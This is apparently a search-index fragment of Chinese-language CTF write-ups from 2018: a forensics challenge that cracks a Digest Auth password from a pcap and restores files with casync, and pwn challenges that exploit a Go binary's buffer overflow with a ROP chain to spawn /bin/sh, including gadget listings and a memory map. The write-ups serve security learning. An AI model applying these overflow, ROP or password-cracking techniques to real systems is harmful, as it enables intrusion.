ASIS}\\{50m3\\_4pps\\_u5E\\_M37adat4\\_dOn7\\_I9n0Re\\_th3M!!\\}","title":"Solution"},{"location":"Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/","text":"Trashy Or Classy Challenge Link: Trashy Or Classy Category: forensic Writeup: Trashy Or Classy Don't be Trashy . Try being Classy!! Solution \u6a94\u6848\u8f09\u4e0b\u4f86\u4ee5\u5f8c\u662f\u4e00\u500b pcap pcap \u7528 wireshark \u5927\u6982\u770b\u4e00\u4e0b\uff0c\u597d\u50cf\u662f\u5728\u66b4\u529b\u641c http://167.99.233.88 \u7684\u5b50\u76ee\u9304 Filter: http \u770b\u770b\u6709\u6210\u529f\u627e\u5230\u7684\u76ee\u9304\uff0c\u6709\u4e00\u500b\u56de\u8986\u662f\u6709 Index \u7684 Filter: http.response.code == 200 \u5be6\u969b\u5230\u9019\u500b \u7db2\u5740 \u53bb\u770b\uff0c\u767c\u73fe\u662f\u8981\u8f38\u5165\u5e33\u5bc6\u7684\uff0c\u4ed4\u7d30\u7814\u7a76\u4e00\u4e0b\u9019\u500b\u5c01\u5305\uff0c\u767c\u73fe\u662f Digest Auth\uff0c\u4e14\u6709\u4e00\u4e9b\u8cc7\u8a0a \u5229\u7528\u9019\u4e9b\u8cc7\u8a0a\u642d\u914d rockyou.txt \uff0c\u66b4\u529b\u7b97\u51fa\u5bc6\u78bc\u662f rainbow Casync \u9023\u4e0a\u53bb\u5f8c\uff0c\u53ef\u4ee5\u8f09\u5230 flag.caidx \uff0c\u4e0d\u904e\u9084\u6709\u4e00\u500b\u8cc7\u6599\u593e flag.castr \u9032\u4e0d\u53bb\uff0c\u731c\u6e2c\u53ef\u80fd\u662f\u4e0d\u80fd\u9032\u53bb\u4f46\u77e5\u9053\u6a94\u540d\u7684\u60c5\u6cc1\u4e0b\u53ef\u4ee5\u4e0b\u8f09 \u6839\u64da\u6a94\u540d\uff0c\u627e\u5230\u4e86 casync \u548c desync casync \u5728 ubuntu 17.10 \u4e0a\u7684\u7248\u672c\u6703\u51fa\u73fe Operaion not supported \u7684\u932f\u8aa4\uff0c\u9700\u8981\u81ea\u5df1\u7de8 \u6211\u5011\u4f7f\u7528 desync \u52a0\u4e0a\u81ea\u5df1\u63a5\u7684 proxy (\u901a\u904e Digest Auth) \u5f9e\u9060\u7aef server \u4e0a\u628a\u6574\u4efd\u8cc7\u6599\u593e\u6293\u4e0b\u4f86 % desync extract -s http://167.99.233.88/private/flag.castr/ flag.caidx flagdesync.tar \u6293\u4e0b\u4f86\u5f8c\u770b\u5230\u4e00\u5927\u5806\u7684 chunk\uff0c\u5927\u6982\u7ffb\u4e86\u4e00\u904d\u9084\u662f\u4e0d\u77e5\u9053\u662f\u5e79\u561b\u7528\u7684\uff0c\u7d50\u675f\u5f8c\u770b writeup \u624d\u77e5\u9053\u8981\u7528 casync \u628a\u6a94\u6848\u9084\u539f Orz % casync extract --store=./flag.castr ./flag.caidx ./flag \u9084\u539f\u5f8c\u5c31\u62ff\u5230\u4e86\u4e00\u500b flag.png","title":"Trashy Or Classy"},{"location":"Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/#trashy-or-classy","text":"Challenge Link: Trashy Or Classy Category: forensic Writeup: Trashy Or Classy Don't be Trashy . Try being Classy!!","title":"Trashy Or Classy"},{"location":"Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/#solution","text":"\u6a94\u6848\u8f09\u4e0b\u4f86\u4ee5\u5f8c\u662f\u4e00\u500b pcap","title":"Solution"},{"location":"Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/#pcap","text":"\u7528 wireshark \u5927\u6982\u770b\u4e00\u4e0b\uff0c\u597d\u50cf\u662f\u5728\u66b4\u529b\u641c http://167.99.233.88 \u7684\u5b50\u76ee\u9304 Filter: http \u770b\u770b\u6709\u6210\u529f\u627e\u5230\u7684\u76ee\u9304\uff0c\u6709\u4e00\u500b\u56de\u8986\u662f\u6709 Index \u7684 Filter: http.response.code == 200 \u5be6\u969b\u5230\u9019\u500b \u7db2\u5740 \u53bb\u770b\uff0c\u767c\u73fe\u662f\u8981\u8f38\u5165\u5e33\u5bc6\u7684\uff0c\u4ed4\u7d30\u7814\u7a76\u4e00\u4e0b\u9019\u500b\u5c01\u5305\uff0c\u767c\u73fe\u662f Digest Auth\uff0c\u4e14\u6709\u4e00\u4e9b\u8cc7\u8a0a \u5229\u7528\u9019\u4e9b\u8cc7\u8a0a\u642d\u914d rockyou.txt \uff0c\u66b4\u529b\u7b97\u51fa\u5bc6\u78bc\u662f rainbow","title":"pcap"},{"location":"Writeups/2018/ASIS_CTF_qual/Trashy_Or_Classy/#casync","text":"\u9023\u4e0a\u53bb\u5f8c\uff0c\u53ef\u4ee5\u8f09\u5230 flag.caidx \uff0c\u4e0d\u904e\u9084\u6709\u4e00\u500b\u8cc7\u6599\u593e flag.castr \u9032\u4e0d\u53bb\uff0c\u731c\u6e2c\u53ef\u80fd\u662f\u4e0d\u80fd\u9032\u53bb\u4f46\u77e5\u9053\u6a94\u540d\u7684\u60c5\u6cc1\u4e0b\u53ef\u4ee5\u4e0b\u8f09 \u6839\u64da\u6a94\u540d\uff0c\u627e\u5230\u4e86 casync \u548c desync casync \u5728 ubuntu 17.10 \u4e0a\u7684\u7248\u672c\u6703\u51fa\u73fe Operaion not supported \u7684\u932f\u8aa4\uff0c\u9700\u8981\u81ea\u5df1\u7de8 \u6211\u5011\u4f7f\u7528 desync \u52a0\u4e0a\u81ea\u5df1\u63a5\u7684 proxy (\u901a\u904e Digest Auth) \u5f9e\u9060\u7aef server \u4e0a\u628a\u6574\u4efd\u8cc7\u6599\u593e\u6293\u4e0b\u4f86 % desync extract -s http://167.99.233.88/private/flag.castr/ flag.caidx flagdesync.tar \u6293\u4e0b\u4f86\u5f8c\u770b\u5230\u4e00\u5927\u5806\u7684 chunk\uff0c\u5927\u6982\u7ffb\u4e86\u4e00\u904d\u9084\u662f\u4e0d\u77e5\u9053\u662f\u5e79\u561b\u7528\u7684\uff0c\u7d50\u675f\u5f8c\u770b writeup \u624d\u77e5\u9053\u8981\u7528 casync \u628a\u6a94\u6848\u9084\u539f Orz % casync extract --store=./flag.castr ./flag.caidx ./flag \u9084\u539f\u5f8c\u5c31\u62ff\u5230\u4e86\u4e00\u500b flag.png","title":"Casync"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/","text":"infant-gogogo Challenge Link: infant-gogogo Category: pwn Writeup: infant-gogogo Give me your magic text ~ nc bamboofox.cs.nctu.edu.tw 58795 infant-gogogo.zip \u89c0\u5bdf \u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32\uff0c\u770b\u8d77\u4f86\u8ddf\u524d\u4e00\u984c\u7684 infant-gotoheaven \u5f88\u50cf % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaa Buffer overflow \u5148\u8a66\u4e00\u4e0b\u662f\u5426\u4e5f\u6709 Buffer overflow % ./infant-gogogo Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa unexpected fault address 0x0 fatal error: fault [signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834] goroutine 1 [running]: runtime.throw(0x4b9168, 0x5) /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345 runtime.sigpanic() /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307 main.main() /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834 \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gogogo.go:20 \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret \uff0c\u6240\u4ee5\u61c9\u8a72\u8ddf\u4e0a\u984c\u4e00\u6a23\uff0c\u4e5f\u662f\u53ef\u4ee5 \u84cb\u5230 return address \u89e3\u6cd5 \u9019\u984c\u8ddf infant-gotoheaven \u7684\u4e3b\u8981\u5dee\u5225\u5728\u65bc infant-gotoheaven \u6709\u63d0\u4f9b\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230 shell \u7684 system call \uff0c\u9019\u984c\u5247\u8981\u81ea\u5df1\u5efa ROP chain payload \u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4 \u8a08\u7b97\u4e00\u4e0b payload \u662f 256 ROP chain \u56e0\u70ba Go \u7684 binanry \u6a94\u662f static link \u7684\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f9e\u88e1\u9762\u62ff\u5230\u5404\u5f0f\u5404\u6a23\u7684 gadget % file infant-gogogo infant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped execve \u6839\u64da \u9019\u7bc7 \u6574\u7406\u7684\u8868\u683c\uff0c\u8981\u57f7\u884c execve(\"/bin/sh\") \u7684\u689d\u4ef6\u662f rax System call rdi rsi rdx 59 sys_execve const char *filename const char *const argv[] const char *const envp[] \u57f7\u884c /bin/sh \u7684\u8a71\uff0c\u53ea\u9700\u8981\u628a rdi \u6307\u5411\u5beb\u6709 /bin/sh \u7684 \u4f4d\u5740 \uff0c rsi \u53ca rdx \u5247\u8a2d\u6210 0 (NULL) \u5373\u53ef ROP gadget \u57fa\u672c\u4e0a\u5728\u8a2d\u503c\u7684\u6642\u5019\uff0c\u5982\u679c\u53ef\u4ee5\u62ff\u5230 pop {resister}; ret \u5f62\u5f0f\u7684 gadget \u6700\u597d\uff0c\u56e0\u70ba\u53ef\u4ee5\u76f4\u63a5\u628a\u8981\u4e1f\u5165\u7684\u503c\u5beb\u5728 gadget \u7684\u4e0b\u4e00\u4f4d\uff0c\u4f8b\u5982\uff1a ropchain = pop_rax, p64(59) \u9019\u6a23\u5728\u57f7\u884c pop rax \u6642\uff0c\u6703\u5c07 stack \u4e0a\u7684\u7b2c\u4e00\u4f4d pop \u5230 rax \u4e0a\uff0c\u800c\u6b64\u6642\u7684\u7b2c\u4e00\u4f4d\u5c31\u6703\u662f p64(59) \u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u8981\u6ce8\u610f \u6700\u5f8c\u9762\u5fc5\u9808\u662f ret \uff0c\u5426\u5247\u6c92\u8fa6\u6cd5\u7e7c\u7e8c\u57f7\u884c\u5f8c\u6bb5\u7684 ROP chain \u5c0b\u627e ROP gadget \u53ef\u4ee5\u4f7f\u7528\u6307\u4ee4 ROPgadget \u642d\u914d grep \uff0c\u4f8b\u5982\u8aaa\u8981\u627e pop rax \u6642\uff1a % ROPgadget --binary infant-gogogo | grep 'pop rax.*ret' 0x000000000044dd12 : add eax, ebp ; pop rax ; ret 0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret 0x0000000000466d3e : je 0x466d67 ; pop rax ; ret 0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret 0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret 0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret 0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret 0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret 0x000000000040985c : pop rax ; or dh, dh ; ret 0x0000000000404656 : pop rax ; ret 0x0000000000414f4a : pop rax ; ret 0xff2 0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret \u5176\u4e2d\u53ef\u4ee5\u770b\u5230 0x0000000000404656 : pop rax ; ret \u662f\u6700\u7b26\u5408\u7684 gadget /bin/sh \u524d\u9762\u6709\u8aaa\u5230\uff0c rdi \u662f\u5beb\u6709 /bin/sh \u7684 \u4f4d\u5740 \uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u584a\u7a7a\u9593\u4f86\u5beb /bin/sh \u5728 gdb \u4e2d\u4f7f\u7528 vmmap \u4f86\u5c0b\u627e\u53ef\u7528\u7a7a\u9593 gdb-peda$ vmmap Start End Perm Name 0x00400000 0x0048a000 r-xp /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0048a000 0x0051c000 r--p /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0051c000 0x0052f000 rw-p /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0052f000 0x00550000 rw-p [heap] 0x000000c000000000 0x000000c000001000 rw-p mapped 0x000000c41fff8000 0x000000c420100000 rw-p mapped 0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p mapped 0x00007ffff7ffb000 0x00007ffff7ffd000 r--p [vvar] 0x00007ffff7ffd000 0x00007ffff7fff000 r-xp [vdso] 0x00007ffffffde000 0x00007ffffffff000 rw-p [stack] 0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] \u5176\u4e2d\u6709\u6bb5 0x0051c000 0x0052f000 rw-p \u662f\u53ef\u5beb\u7684\uff0c\u6211\u9078\u64c7 0x523000 \u4f86\u5beb\uff0c\u76e1\u91cf\u4e0d\u8981\u9078\u64c7\u592a\u524d\u9762\u6216\u592a\u5f8c\u9762\u7684\u4f4d\u7f6e\uff0c\u6015\u8ddf\u5176\u4ed6\u6771\u897f\u885d\u5230 \u53ef\u4ee5\u5beb\u5165\u5230 rdi \u7684\u6709\u4ee5\u4e0b\u5169\u53e5 0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret 0x00000000004518ff : mov qword ptr [rdi], rax ; ret \u5176\u4e2d\uff0c pop rdi \u7684 gadget \u5f8c\u9762\u9084\u6709 add byte ptr [rax + 0x39] \uff0c\u6240\u4ee5\u5fc5\u9808\u78ba\u4fdd rax+0x39 \u662f\u4e00\u6bb5\u53ef\u4ee5\u5beb\u7684\u4f4d\u5740\uff0c\u5426\u5247\u6703\u6b7b\u6389 \u56e0\u6b64\u6211\u5148\u5c07 rax \u8a2d\u6210 data \u7684\u4f4d\u5740\uff0c\u8a2d\u5b8c rdi \u5f8c\uff0c\u518d\u5c07 rax \u8a2d\u6210 /bin/sh \uff0c\u6700\u5f8c\u586b\u5165 ptr [rdi] \u4e2d\u5373\u53ef \u6240\u6709\u5f97\u689d\u4ef6\u90fd\u8a2d\u5b9a\u5b8c\u6210\u5f8c\uff0c\u57f7\u884c\u5373\u53ef\u62ff\u5230 shell \u56c9 OwO","title":"infant-gogogo"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#infant-gogogo","text":"Challenge Link: infant-gogogo Category: pwn Writeup: infant-gogogo Give me your magic text ~ nc bamboofox.cs.nctu.edu.tw 58795 infant-gogogo.zip","title":"infant-gogogo"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#_1","text":"\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32\uff0c\u770b\u8d77\u4f86\u8ddf\u524d\u4e00\u984c\u7684 infant-gotoheaven \u5f88\u50cf % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaa","title":"\u89c0\u5bdf"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#buffer-overflow","text":"\u5148\u8a66\u4e00\u4e0b\u662f\u5426\u4e5f\u6709 Buffer overflow % ./infant-gogogo Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa unexpected fault address 0x0 fatal error: fault [signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834] goroutine 1 [running]: runtime.throw(0x4b9168, 0x5) /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345 runtime.sigpanic() /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307 main.main() /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834 \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gogogo.go:20 \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret \uff0c\u6240\u4ee5\u61c9\u8a72\u8ddf\u4e0a\u984c\u4e00\u6a23\uff0c\u4e5f\u662f\u53ef\u4ee5 \u84cb\u5230 return address","title":"Buffer overflow"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#_2","text":"\u9019\u984c\u8ddf infant-gotoheaven \u7684\u4e3b\u8981\u5dee\u5225\u5728\u65bc infant-gotoheaven \u6709\u63d0\u4f9b\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230 shell \u7684 system call \uff0c\u9019\u984c\u5247\u8981\u81ea\u5df1\u5efa ROP chain","title":"\u89e3\u6cd5"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#payload","text":"\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4 \u8a08\u7b97\u4e00\u4e0b payload \u662f 256","title":"payload"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#rop-chain","text":"\u56e0\u70ba Go \u7684 binanry \u6a94\u662f static link \u7684\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f9e\u88e1\u9762\u62ff\u5230\u5404\u5f0f\u5404\u6a23\u7684 gadget % file infant-gogogo infant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped","title":"ROP chain"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#execve","text":"\u6839\u64da \u9019\u7bc7 \u6574\u7406\u7684\u8868\u683c\uff0c\u8981\u57f7\u884c execve(\"/bin/sh\") \u7684\u689d\u4ef6\u662f rax System call rdi rsi rdx 59 sys_execve const char *filename const char *const argv[] const char *const envp[] \u57f7\u884c /bin/sh \u7684\u8a71\uff0c\u53ea\u9700\u8981\u628a rdi \u6307\u5411\u5beb\u6709 /bin/sh \u7684 \u4f4d\u5740 \uff0c rsi \u53ca rdx \u5247\u8a2d\u6210 0 (NULL) \u5373\u53ef","title":"execve"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#rop-gadget","text":"\u57fa\u672c\u4e0a\u5728\u8a2d\u503c\u7684\u6642\u5019\uff0c\u5982\u679c\u53ef\u4ee5\u62ff\u5230 pop {resister}; ret \u5f62\u5f0f\u7684 gadget \u6700\u597d\uff0c\u56e0\u70ba\u53ef\u4ee5\u76f4\u63a5\u628a\u8981\u4e1f\u5165\u7684\u503c\u5beb\u5728 gadget \u7684\u4e0b\u4e00\u4f4d\uff0c\u4f8b\u5982\uff1a ropchain = pop_rax, p64(59) \u9019\u6a23\u5728\u57f7\u884c pop rax \u6642\uff0c\u6703\u5c07 stack \u4e0a\u7684\u7b2c\u4e00\u4f4d pop \u5230 rax \u4e0a\uff0c\u800c\u6b64\u6642\u7684\u7b2c\u4e00\u4f4d\u5c31\u6703\u662f p64(59) \u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u8981\u6ce8\u610f \u6700\u5f8c\u9762\u5fc5\u9808\u662f ret \uff0c\u5426\u5247\u6c92\u8fa6\u6cd5\u7e7c\u7e8c\u57f7\u884c\u5f8c\u6bb5\u7684 ROP chain \u5c0b\u627e ROP gadget \u53ef\u4ee5\u4f7f\u7528\u6307\u4ee4 ROPgadget \u642d\u914d grep \uff0c\u4f8b\u5982\u8aaa\u8981\u627e pop rax \u6642\uff1a % ROPgadget --binary infant-gogogo | grep 'pop rax.*ret' 0x000000000044dd12 : add eax, ebp ; pop rax ; ret 0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret 0x0000000000466d3e : je 0x466d67 ; pop rax ; ret 0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret 0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret 0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret 0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret 0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret 0x000000000040985c : pop rax ; or dh, dh ; ret 0x0000000000404656 : pop rax ; ret 0x0000000000414f4a : pop rax ; ret 0xff2 0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret \u5176\u4e2d\u53ef\u4ee5\u770b\u5230 0x0000000000404656 : pop rax ; ret \u662f\u6700\u7b26\u5408\u7684 gadget","title":"ROP gadget"},{"location":"Writeups/2018/BambooFox_CTF/infant-gogogo/#binsh","text":"\u524d\u9762\u6709\u8aaa\u5230\uff0c rdi \u662f\u5beb\u6709 /bin/sh \u7684 \u4f4d\u5740 \uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u584a\u7a7a\u9593\u4f86\u5beb /bin/sh \u5728 gdb \u4e2d\u4f7f\u7528 vmmap \u4f86\u5c0b\u627e\u53ef\u7528\u7a7a\u9593 gdb-peda$ vmmap Start End Perm Name 0x00400000 0x0048a000 r-xp /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0048a000 0x0051c000 r--p /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0051c000 0x0052f000 rw-p /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo 0x0052f000 0x00550000 rw-p [heap] 0x000000c000000000 0x000000c000001000 rw-p mapped 0x000000c41fff8000 0x000000c420100000 rw-p mapped 0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p mapped 0x00007ffff7ffb000 0x00007ffff7ffd000 r--p [vvar] 0x00007ffff7ffd000 0x00007ffff7fff000 r-xp [vdso] 0x00007ffffffde000 0x00007ffffffff000 rw-p [stack] 0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] \u5176\u4e2d\u6709\u6bb5 0x0051c000 0x0052f000 rw-p \u662f\u53ef\u5beb\u7684\uff0c\u6211\u9078\u64c7 0x523000 \u4f86\u5beb\uff0c\u76e1\u91cf\u4e0d\u8981\u9078\u64c7\u592a\u524d\u9762\u6216\u592a\u5f8c\u9762\u7684\u4f4d\u7f6e\uff0c\u6015\u8ddf\u5176\u4ed6\u6771\u897f\u885d\u5230 \u53ef\u4ee5\u5beb\u5165\u5230 rdi \u7684\u6709\u4ee5\u4e0b\u5169\u53e5 0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret 0x00000000004518ff : mov qword ptr [rdi], rax ; ret \u5176\u4e2d\uff0c pop rdi \u7684 gadget \u5f8c\u9762\u9084\u6709 add byte ptr [rax + 0x39] \uff0c\u6240\u4ee5\u5fc5\u9808\u78ba\u4fdd rax+0x39 \u662f\u4e00\u6bb5\u53ef\u4ee5\u5beb\u7684\u4f4d\u5740\uff0c\u5426\u5247\u6703\u6b7b\u6389 \u56e0\u6b64\u6211\u5148\u5c07 rax \u8a2d\u6210 data \u7684\u4f4d\u5740\uff0c\u8a2d\u5b8c rdi \u5f8c\uff0c\u518d\u5c07 rax \u8a2d\u6210 /bin/sh \uff0c\u6700\u5f8c\u586b\u5165 ptr [rdi] \u4e2d\u5373\u53ef \u6240\u6709\u5f97\u689d\u4ef6\u90fd\u8a2d\u5b9a\u5b8c\u6210\u5f8c\uff0c\u57f7\u884c\u5373\u53ef\u62ff\u5230 shell \u56c9 OwO","title":"/bin/sh"},{"location":"Writeups/2018/BambooFox_CTF/infant-gotoheaven/","text":"infant-gotoheaven Challenge Link: infant-gotoheaven Category: pwn Writeup: infant-gotoheaven What's the token to heaven? nc bamboofox.cs.nctu.edu.tw 58796 infant-gotoheaven.zip Go binanry \u5c0f\u8a23\u7ac5 \u958b\u59cb\u524d\u5148\u8b1b\u4e00\u4e0b\u5206\u6790 Go \u7684 binanry \u6642\u53ef\u4ee5\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u4ee5\u53ca\u8a23\u7ac5 go tool objdump go tool \u662f go \u7684\u7de8\u8b6f\u5668\u5167\u5efa\u7684\u5de5\u5177\u96c6\uff0c\u5176\u4e2d\u4e5f\u6709 objdump \u53ef\u4ee5\u4f7f\u7528 \u4f7f\u7528\u9019\u500b\u5de5\u5177\u7684\u8a71\u53ef\u4ee5\u770b\u5230 source code \u4e2d\u7684 \u884c\u6578 \u5c0d\u61c9\u5230\u7684 assembly go tool objdump infant-gotoheaven | less gdb \u4f7f\u7528 gdb \u8ffd\u8e64\u6642\uff0c\u5728\u57f7\u884c\u5230 main \u4e4b\u524d\u6703\u7d93\u904e\u4e00\u5927\u5806\u7684\u7a0b\u5e8f \u5728\u8ffd\u8e64 C \u7684 binanry \u6642\uff0c\u901a\u5e38\u6703\u4f7f\u7528 b main \u4f86\u8a2d\u65b7\u9ede\u5728 main \u7684\u4e00\u958b\u59cb \u7531\u4e0a\u9762 go tool objdump \u7684\u5716\u53ef\u4ee5\u770b\u5230\uff0cGo \u7684 main \u53eb\u505a main.main \u6240\u4ee5\u8981\u4f7f\u7528 b main.main \u89c0\u5bdf \u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32 % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaa Buffer overflow \u901a\u5e38\u770b\u5230\u9019\u985e\u984c\u76ee\u5927\u6982\u90fd\u662f buffer overflow \uff0c\u6240\u4ee5\u5148\u8a66\u4e00\u4e0b\u80fd\u4e0d\u80fd\u89f8\u767c segmentation fault % ./infant-gotoheaven Give me your text : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa unexpected fault address 0x0 fatal error: fault [signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4a263e] goroutine 1 [running]: runtime.throw(0x4d8780, 0x5) /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427a05 runtime.sigpanic() /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43d037 main.main() /home/frozenkp/Downloads/gobin/infant-gotoheaven/infant-gotoheaven.go:27 +0x1ee fp=0xc420043f80 sp=0xc420043f78 pc=0x4a263e \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gotoheaven.go:27 \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret 